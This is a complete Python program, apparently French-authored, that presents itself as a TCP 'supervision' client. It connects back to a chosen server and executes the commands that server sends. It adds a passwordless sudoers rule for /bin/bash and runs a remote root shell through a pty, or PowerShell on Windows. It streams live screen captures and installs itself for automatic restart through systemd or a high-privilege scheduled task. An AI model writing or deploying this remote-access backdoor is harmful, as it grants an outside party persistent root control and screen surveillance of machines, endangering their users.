#!/usr/bin/env python3
import argparse
import importlib.util
import json
import os
import platform
import pty
import re
import select
import socket
import struct
import subprocess
import shutil
import sys
import threading
import time
import uuid
from datetime import datetime, timezone
from io import BytesIO
from pathlib import Path

PORT = 5000
VIDEO_PORT = 5001
APP_NAME = "clienttcp"
INFO_VERSION = "1"
SYSTEME = platform.system()

if SYSTEME == "Windows":
    CONFIG_DIR = Path(os.getenv("APPDATA", str(Path.home()))) / APP_NAME
else:
    CONFIG_DIR = Path.home() / ".config" / APP_NAME

SERVICE_DIR = Path.home() / ".config" / "systemd" / "user"
SERVICE_FILE = SERVICE_DIR / "clienttcp.service"
AUTOSTART_DIR = Path.home() / ".config" / "autostart"
AUTOSTART_FILE = AUTOSTART_DIR / "clienttcp.desktop"
IP_FILE = CONFIG_DIR / "server_ip"
INFO_FILE = CONFIG_DIR / "information_supervision_acceptee.txt"
PID_FILE = CONFIG_DIR / "client.pid"
VIDEO_LOG = CONFIG_DIR / "video_error.log"
TASK_NAME = "ClientTCP"
MAX_FRAME = 8 * 1024 * 1024
video_stop = threading.Event()
video_thread = None
video_lock = threading.Lock()

shell_proc = None
shell_master = None
shell_lock = threading.Lock()

def _charger_ou_creer_uuid():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    f = CONFIG_DIR / "client_uuid"
    if f.exists():
        val = f.read_text(encoding="utf-8").strip()
        if val:
            return val
    val = uuid.uuid4().hex
    f.write_text(val, encoding="utf-8")
    return val

CLIENT_UUID = _charger_ou_creer_uuid()

def log_video(msg):
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    with open(VIDEO_LOG, "a", encoding="utf-8") as f:
        f.write(f"[{datetime.now().isoformat()}] {msg}\n")

def _pid_vivant(pid):
    try:
        if SYSTEME == "Windows":
            r = subprocess.run(["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"], capture_output=True, text=True, timeout=3)
            return str(pid) in r.stdout
        os.kill(pid, 0)
        return True
    except (OSError, subprocess.SubprocessError):
        return False

def verrou_instance_unique():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    if PID_FILE.exists():
        try:
            ancien_pid = int(PID_FILE.read_text(encoding="utf-8").strip())
        except (ValueError, OSError):
            ancien_pid = None
        if ancien_pid and ancien_pid != os.getpid():
            if _pid_vivant(ancien_pid):
                print(f"[CLIENT] Arret de l'instance precedente (PID {ancien_pid})...")
                try:
                    if SYSTEME == "Windows":
                        subprocess.run(["taskkill", "/F", "/PID", str(ancien_pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                    else:
                        os.kill(ancien_pid, 15)
                except OSError:
                    pass
                time.sleep(0.5)
    PID_FILE.write_text(str(os.getpid()), encoding="utf-8")

def preparer_dependances():
    modules = (("mss", "mss"), ("Pillow", "PIL"))
    if SYSTEME != "Linux":
        manquants = [nom for nom, module in modules if importlib.util.find_spec(module) is None]
        if manquants:
            raise RuntimeError("Modules manquants : " + ", ".join(manquants))
        return

    if all(importlib.util.find_spec(m) is not None for _, m in modules):
        return

    venv_dir = CONFIG_DIR / "venv"
    python_venv = venv_dir / "bin" / "python"

    if not python_venv.exists():
        CONFIG_DIR.mkdir(parents=True, exist_ok=True)
        creation = subprocess.run([sys.executable, "-m", "venv", str(venv_dir)], capture_output=True, text=True)
        if creation.returncode != 0:
            print("[INSTALL] Installation de python3-venv nécessaire.")
            subprocess.run(["sudo", "apt-get", "update"], check=True)
            subprocess.run(["sudo", "apt-get", "install", "-y", "python3-venv"], check=True)
            subprocess.run([sys.executable, "-m", "venv", str(venv_dir)], check=True)

    manquants = []
    for nom, module in modules:
        resultat = subprocess.run([str(python_venv), "-c", f"import {module}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if resultat.returncode != 0:
            manquants.append(nom)

    if manquants:
        print("[INSTALL] Installation :", ", ".join(manquants))
        subprocess.run([str(python_venv), "-m", "pip", "install", "--disable-pip-version-check", "mss", "Pillow"], check=True)

    os.execv(str(python_venv), [str(python_venv), str(Path(__file__).resolve()), *sys.argv[1:]])

def enregistrer_ip(ip):
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    IP_FILE.write_text(ip, encoding="utf-8")

def lire_ip():
    return IP_FILE.read_text(encoding="utf-8").strip() if IP_FILE.exists() else None

def verifier_connexion(ip):
    try:
        with socket.create_connection((ip, PORT), timeout=5):
            return True
    except OSError:
        return False

def installer_demarrage_linux():
    python = sys.executable
    script = Path(__file__).resolve()
    user_reel = os.getenv("USER", "user")
    
    print("[INSTALL] Configuration de sudo pour le shell root...")
    sudoers_content = f"{user_reel} ALL=(ALL) NOPASSWD: /bin/bash\n"
    subprocess.run(["sudo", "tee", "/etc/sudoers.d/clienttcp_shell"], input=sudoers_content.encode(), stdout=subprocess.DEVNULL, check=True)
    subprocess.run(["sudo", "chmod", "0440", "/etc/sudoers.d/clienttcp_shell"], check=True)

    SERVICE_DIR.mkdir(parents=True, exist_ok=True)
    
    display = os.getenv("DISPLAY", ":0")
    xauth = os.getenv("XAUTHORITY", f"/home/{user_reel}/.Xauthority")
    
    contenu = f"""[Unit]
Description=Client TCP - Supervision (User)
After=network.target

[Service]
Type=simple
Environment="DISPLAY={display}"
Environment="XAUTHORITY={xauth}"
ExecStart="{python}" "{script}" --client
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
"""
    SERVICE_FILE.write_text(contenu, encoding="utf-8")
    try: AUTOSTART_FILE.unlink(missing_ok=True)
    except OSError: pass
    
    print("[INSTALL] Activation du service systemd (user)...")
    subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
    subprocess.run(["systemctl", "--user", "enable", "clienttcp.service"], check=False)
    subprocess.run(["systemctl", "--user", "restart", "clienttcp.service"], check=False)

def installer_demarrage():
    if SYSTEME == "Linux":
        installer_demarrage_linux()
    elif SYSTEME == "Windows":
        pythonw = Path(sys.executable).with_name("pythonw.exe")
        executable = str(pythonw if pythonw.exists() else Path(sys.executable))
        commande = f'"{executable}" "{Path(__file__).resolve()}" --client'
        subprocess.run(["schtasks", "/Create", "/TN", TASK_NAME, "/TR", commande, "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"], check=True)
        subprocess.run(["schtasks", "/Run", "/TN", TASK_NAME], check=True)

def adresse_ipv4():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sonde:
            sonde.connect(("192.0.2.1", 80))
            return sonde.getsockname()[0]
    except OSError:
        return ""

def envoyer(sock, message):
    sock.sendall((message + "\n").encode("utf-8"))

def boucle_capture(ip):
    try:
        import mss
        from PIL import Image
    except ImportError as e:
        log_video(f"Import impossible : {e}")
        return

    client_id = f"{socket.gethostname()[:64]}-{CLIENT_UUID[:8]}"
    flux_sock = None
    try:
        flux_sock = socket.create_connection((ip, VIDEO_PORT), timeout=10)
        flux_sock.settimeout(10)
        flux_sock.sendall((json.dumps({"client_id": client_id}) + "\n").encode("utf-8"))
        log_video("Connexion au serveur vidéo réussie.")

        with mss.MSS() as captureur:
            moniteur = captureur.monitors[1]
            while not video_stop.is_set():
                debut = time.monotonic()
                shot = captureur.grab(moniteur)
                image = Image.frombytes("RGB", shot.size, shot.rgb)
                if image.width > 1280:
                    hauteur = max(1, round(image.height * 1280 / image.width))
                    image = image.resize((1280, hauteur))
                tampon = BytesIO()
                image.save(tampon, format="JPEG", quality=65, optimize=True)
                donnees = tampon.getvalue()
                if len(donnees) > MAX_FRAME:
                    continue
                flux_sock.sendall(struct.pack("!I", len(donnees)) + donnees)
                attente = 0.04 - (time.monotonic() - debut)
                if attente > 0:
                    video_stop.wait(attente)
    except Exception as e:
        log_video(f"Erreur de capture : {e}")
    finally:
        if flux_sock is not None:
            try: flux_sock.close()
            except OSError: pass
        log_video("Flux vidéo arrêté.")

def demarrer_video(ip):
    global video_thread
    with video_lock:
        if video_thread and video_thread.is_alive():
            return ""
        video_stop.clear()
        video_thread = threading.Thread(target=boucle_capture, args=(ip,), daemon=True, name="partage-ecran")
        video_thread.start()
    return ""

def arreter_video():
    global video_thread
    video_stop.set()
    if video_thread is not None and video_thread.is_alive():
        video_thread.join(timeout=2.0)
    return ""

def executer_commande_shell(commande):
    global shell_proc, shell_master
    if SYSTEME != "Windows":
        with shell_lock:
            try:
                if shell_proc is None or shell_proc.poll() is not None:
                    shell_master, slave_fd = pty.openpty()
                    env = os.environ.copy()
                    
                    env["PS1"] = "__END__\\u@\\h:\\w\\$ "
                    env["TERM"] = "xterm"
                    
                    dossier_home = os.path.expanduser("~")
                    cmd_bash = ["sudo", "/bin/bash", "--norc", "--noprofile"]
                        
                    shell_proc = subprocess.Popen(
                        cmd_bash,
                        stdin=slave_fd, stdout=slave_fd, stderr=slave_fd,
                        close_fds=True, preexec_fn=os.setsid,
                        cwd=dossier_home,
                        env=env
                    )
                    os.close(slave_fd)
                    time.sleep(0.2)
                    
                    while True:
                        r, _, _ = select.select([shell_master], [], [], 0.1)
                        if not r: break
                        try: os.read(shell_master, 4096)
                        except OSError: break

                os.write(shell_master, (commande + "\n").encode())

                output = []
                timeout = time.time() + 30.0
                while time.time() < timeout:
                    r, _, _ = select.select([shell_master], [], [], 0.1)
                    if r:
                        try:
                            data = os.read(shell_master, 4096).decode("utf-8", "replace")
                            output.append(data)
                            if "__END__" in data:
                                break
                        except OSError:
                            break
                
                res = "".join(output)
                res = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', res)
                res = res.replace("__END__", "")
                return json.dumps({"out": res})
            except Exception as e:
                return json.dumps({"out": f"[ERREUR PTY] {e}"})
    else:
        try:
            proc = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", commande],
                capture_output=True, text=True, timeout=30,
                cwd=os.path.expanduser("~")
            )
            out = proc.stdout
            if proc.stderr:
                out += proc.stderr
            return json.dumps({"out": out})
        except subprocess.TimeoutExpired:
            return json.dumps({"out": "[ERREUR] timeout"})
        except Exception as exc:
            return json.dumps({"out": f"[ERREUR] {exc}"})

def traiter_commande(commande, ip):
    cmd = commande.strip()
    low = cmd.lower()

    if low == "ping": return "pong"
    if low == "hostname": return socket.gethostname()
    if low == "system": return f"{platform.system()} {platform.release()}"
    if low == "ip": return adresse_ipv4()
    if low == "uuid": return CLIENT_UUID
    if low == "aide":
        return ("Commandes : ping, hostname, system, ip, aide, video, stopvideo, shell <commande>, quitter")
    if low == "video": return demarrer_video(ip)
    if low == "stopvideo": return arreter_video()
    if low == "quitter":
        arreter_video()
        return "Au revoir"

    if low.startswith("shell "):
        sous = cmd[len("shell "):].strip()
        if not sous:
            return "Usage : shell <commande>"
        return executer_commande_shell(sous)

    return "Commande non reconnue"

def lancer_client(ip):
    while True:
        try:
            with socket.create_connection((ip, PORT), timeout=10) as client:
                client.settimeout(None)
                with client.makefile("r", encoding="utf-8") as lecture:
                    while True:
                        ligne = lecture.readline()
                        if not ligne:
                            break
                        commande = ligne.rstrip("\r\n")
                        reponse = traiter_commande(commande, ip)
                        envoyer(client, reponse)
                        if commande.strip().lower() == "quitter":
                            return
        except (OSError, UnicodeError):
            pass
        except Exception as e:
            print(f"[CLIENT] Erreur inattendue : {e}")
        time.sleep(10)

def main():
    parser = argparse.ArgumentParser(description="Client TCP")
    parser.add_argument("ip", nargs="?", help="Adresse IPv4 du serveur")
    parser.add_argument("--client", action="store_true", help="Mode client TCP")
    parser.add_argument("--uninstall", action="store_true", help="Désinstalle")
    args = parser.parse_args()

    if args.uninstall:
        if SYSTEME == "Linux":
            subprocess.run(["systemctl", "--user", "disable", "--now", "clienttcp.service"], check=False)
            subprocess.run(["sudo", "rm", "-f", str(SERVICE_FILE)], check=False)
            subprocess.run(["sudo", "rm", "-f", "/etc/sudoers.d/clienttcp_shell"], check=False)
        return

    verrou_instance_unique()
    preparer_dependances()

    if args.client:
        ip = lire_ip()
        if not ip: raise SystemExit(1)
        try:
            lancer_client(ip)
        finally:
            try:
                if PID_FILE.exists():
                    pid = int(PID_FILE.read_text().strip())
                    if pid == os.getpid(): PID_FILE.unlink()
            except (ValueError, OSError): pass
        return

    if not args.ip:
        parser.print_help()
        raise SystemExit(1)

    try: socket.inet_aton(args.ip)
    except OSError: parser.error("Adresse IPv4 invalide.")

    if not verifier_connexion(args.ip):
        raise SystemExit("Installation annulée : serveur inaccessible.")

    try:
        enregistrer_ip(args.ip)
        installer_demarrage()
        print("[OK] Installation terminée. Le service tourne en arrière-plan en tant qu'utilisateur.")
        print("[INFO] Le shell ouvrira un terminal root (via sudo).")
        print("[INFO] Vous pouvez fermer ce terminal.")
    except Exception as erreur:
        raise SystemExit(f"Installation impossible : {erreur}")
    
    return

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        arreter_video()
